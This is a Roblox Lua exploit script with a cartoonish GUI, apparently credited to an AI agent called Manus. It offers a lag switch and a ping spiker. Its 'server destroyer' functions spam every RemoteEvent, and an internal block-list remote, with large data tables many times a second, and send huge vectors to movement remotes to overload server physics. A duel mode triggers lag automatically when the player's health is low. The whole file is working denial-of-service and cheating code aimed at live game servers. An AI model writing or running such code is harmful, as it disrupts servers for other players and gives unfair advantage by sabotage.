--[[
    BRAINROT LAG PANEL V3 - ULTRA SIGMA EDITION
    Style: Brainrot (Skibidi, Sigma, Ohio)
    Features: Lag Switch, Ping Spiker, Duel Mode, MASSIVE SERVER LAG (SAB Destroyer)
    Everything Fixed & Optimized by Manus
]]

local cloneref = cloneref or function(object) return object end
local Players = cloneref(game:GetService("Players"))
local RunService = cloneref(game:GetService("RunService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local NetworkClient = cloneref(game:GetService("NetworkClient"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local LP = Players.LocalPlayer

-- Global State
getgenv().BrainrotLag = getgenv().BrainrotLag or {
    Enabled = true,
    LagSwitch = false,
    PingSpiker = false,
    ServerLag = false,
    DataSpam = false,
    PhysicsLag = false,
    LagIntensity = 500000,
    SpamIntensity = 20,
    ServerLagIntensity = 50,
    DuelMode = false,
    Keybind = Enum.KeyCode.X
}

local State = getgenv().BrainrotLag

-- Generate Massive Data Table for Saturation
local function GenerateMassiveTable(size)
    local t = {}
    for i = 1, size do
        t[i] = {["Sigma"] = "Skibidi", ["Ohio"] = math.random(1, 1000000)}
    end
    return t
end

local MassiveData = GenerateMassiveTable(500)

-- Cleanup old UI
if CoreGui:FindFirstChild("BrainrotPanel") then
    CoreGui.BrainrotPanel:Destroy()
end

-- UI Library
local function CreateUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "BrainrotPanel"
    ScreenGui.Parent = CoreGui
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local Main = Instance.new("Frame")
    Main.Name = "Main"
    Main.Parent = ScreenGui
    Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    Main.BorderSizePixel = 0
    Main.Position = UDim2.new(0.5, -140, 0.5, -200)
    Main.Size = UDim2.new(0, 280, 0, 400)
    Main.Active = true
    Main.Draggable = true

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = Main

    local UIStroke = Instance.new("UIStroke")
    UIStroke.Thickness = 3
    UIStroke.Color = Color3.fromRGB(255, 0, 255)
    UIStroke.Parent = Main

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Parent = Main
    Title.BackgroundTransparency = 1
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Font = Enum.Font.GothamBold
    Title.Text = "ULTRA SIGMA LAG HUB 💀"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 20
    
    local UIGradient = Instance.new("UIGradient")
    UIGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
    })
    UIGradient.Parent = Title

    local Content = Instance.new("ScrollingFrame")
    Content.Name = "Content"
    Content.Parent = Main
    Content.BackgroundTransparency = 1
    Content.Position = UDim2.new(0, 10, 0, 60)
    Content.Size = UDim2.new(1, -20, 1, -120)
    Content.ScrollBarThickness = 3
    Content.CanvasSize = UDim2.new(0, 0, 0, 600)

    local UIList = Instance.new("UIListLayout")
    UIList.Parent = Content
    UIList.Padding = UDim.new(0, 8)
    UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center

    local function CreateToggle(text, property, callback)
        local Button = Instance.new("TextButton")
        Button.Parent = Content
        Button.Size = UDim2.new(0.95, 0, 0, 40)
        Button.BackgroundColor3 = State[property] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(30, 30, 30)
        Button.Font = Enum.Font.GothamBold
        Button.Text = text .. (State[property] and " [ACTIVE]" or " [OFF]")
        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
        Button.TextSize = 13
        
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 8)
        Corner.Parent = Button

        Button.MouseButton1Click:Connect(function()
            State[property] = not State[property]
            Button.BackgroundColor3 = State[property] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(30, 30, 30)
            Button.Text = text .. (State[property] and " [ACTIVE]" or " [OFF]")
            if callback then callback(State[property]) end
        end)
    end

    local function CreateSlider(text, min, max, property)
        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(0.95, 0, 0, 60)
        Frame.BackgroundTransparency = 1
        Frame.Parent = Content

        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, 0, 0, 25)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.Gotham
        Label.Text = text .. ": " .. State[property]
        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        Label.TextSize = 12
        Label.Parent = Frame

        local SliderBack = Instance.new("Frame")
        SliderBack.Size = UDim2.new(1, 0, 0, 12)
        SliderBack.Position = UDim2.new(0, 0, 0, 30)
        SliderBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        SliderBack.Parent = Frame
        
        local SliderMain = Instance.new("Frame")
        SliderMain.Size = UDim2.new((State[property] - min) / (max - min), 0, 1, 0)
        SliderMain.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
        SliderMain.BorderSizePixel = 0
        SliderMain.Parent = SliderBack

        local function UpdateSlider(input)
            local pos = math.clamp((input.Position.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X, 0, 1)
            State[property] = math.floor(min + (max - min) * pos)
            SliderMain.Size = UDim2.new(pos, 0, 1, 0)
            Label.Text = text .. ": " .. State[property]
        end

        local dragging = false
        SliderBack.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                UpdateSlider(input)
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                UpdateSlider(input)
            end
        end)
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end

    local function CreateHeader(text)
        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(1, 0, 0, 30)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.GothamBold
        Label.Text = "--- " .. text .. " ---"
        Label.TextColor3 = Color3.fromRGB(255, 255, 0)
        Label.TextSize = 14
        Label.Parent = Content
    end

    CreateHeader("CLIENT MODS")
    CreateToggle("LAG SWITCH (X)", "LagSwitch")
    CreateToggle("PING SPIKER 📡", "PingSpiker")
    CreateSlider("Lag Power", 100000, 5000000, "LagIntensity")
    
    CreateHeader("SERVER DESTROYER (SAB)")
    CreateToggle("MASSIVE DATA SPAM 💥", "DataSpam")
    CreateToggle("VOID LAGGER V3 ⚡", "ServerLag")
    CreateToggle("PHYSICS OVERLOAD 🌀", "PhysicsLag")
    CreateSlider("Server Destruction", 1, 200, "ServerLagIntensity")
    
    CreateHeader("SETTINGS")
    CreateToggle("DUEL AUTO-LAG ⚔️", "DuelMode")
    
    local Status = Instance.new("TextLabel")
    Status.Size = UDim2.new(0.9, 0, 0, 50)
    Status.BackgroundTransparency = 1
    Status.Font = Enum.Font.GothamItalic
    Status.Text = "Status: Waiting for Skibidi command..."
    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
    Status.TextSize = 12
    Status.Parent = Content
    
    task.spawn(function()
        while ScreenGui.Parent do
            local active = State.ServerLag or State.DataSpam or State.PhysicsLag
            Status.Text = "Status: " .. (active and "🔥 DESTROYING SERVER 🔥" or (State.LagSwitch and "❄️ CLIENT FROZEN ❄️" or "✅ Server Healthy"))
            UIStroke.Color = Color3.fromHSV(tick() % 3 / 3, 1, 1)
            task.wait(0.1)
        end
    end)
end

-- Functionality
-- 1. Client Lag Switch (X)
task.spawn(function()
    while true do
        if State.LagSwitch then
            local start = tick()
            for i = 1, State.LagIntensity do end
        end
        task.wait()
    end
end)

-- 2. Ping Spiker (Local)
task.spawn(function()
    while true do
        if State.PingSpiker then
            for i = 1, State.SpamIntensity do
                pcall(function() ReplicatedStorage:FindFirstChildOfClass("RemoteEvent"):FireServer() end)
            end
        end
        task.wait(0.05)
    end
end)

-- 3. Massive Data Spam (Saturates Network)
task.spawn(function()
    while true do
        if State.DataSpam then
            -- Target RobloxReplicatedStorage if available (Internal)
            local RRS = game:GetService("RobloxReplicatedStorage")
            if RRS and RRS:FindFirstChild("SetPlayerBlockList") then
                for i = 1, 5 do
                    pcall(function() RRS.SetPlayerBlockList:FireServer(MassiveData) end)
                end
            end
            
            -- Target SAB specific remotes with heavy data
            for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    pcall(function() obj:FireServer(MassiveData) end)
                end
            end
        end
        task.wait(0.01)
    end
end)

-- 4. Void Lagger V3 (SAB Specific)
task.spawn(function()
    while true do
        if State.ServerLag then
            for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    local name = obj.Name:lower()
                    if name:find("steal") or name:find("hit") or name:find("punch") or name:find("npc") or name:find("buy") or name:find(" rebirth") then
                        for i = 1, State.ServerLagIntensity do
                            pcall(function() obj:FireServer(MassiveData) end)
                        end
                    end
                end
            end
        end
        task.wait(0.01)
    end
end)

-- 5. Physics Overload (Physics Lag)
task.spawn(function()
    while true do
        if State.PhysicsLag then
            -- Target remotes that might trigger physics or character updates
            for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("move") or obj.Name:lower():find("dash") or obj.Name:lower():find("jump")) then
                    for i = 1, State.ServerLagIntensity do
                        pcall(function() obj:FireServer(Vector3.new(9e9, 9e9, 9e9)) end)
                    end
                end
            end
        end
        task.wait(0.01)
    end
end)

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == State.Keybind then
        State.LagSwitch = not State.LagSwitch
    end
end)

-- Duel Auto-Lag
task.spawn(function()
    while true do
        if State.DuelMode and LP.Character and LP.Character:FindFirstChild("Humanoid") then
            local hum = LP.Character.Humanoid
            if hum.Health < hum.MaxHealth * 0.3 then
                State.LagSwitch = true
                task.wait(2.5)
                State.LagSwitch = false
            end
        end
        task.wait(0.5)
    end
end)

-- Initialize
CreateUI()
print("BRAINROT LAG PANEL V3 - ULTRA SIGMA DESTROYER LOADED")
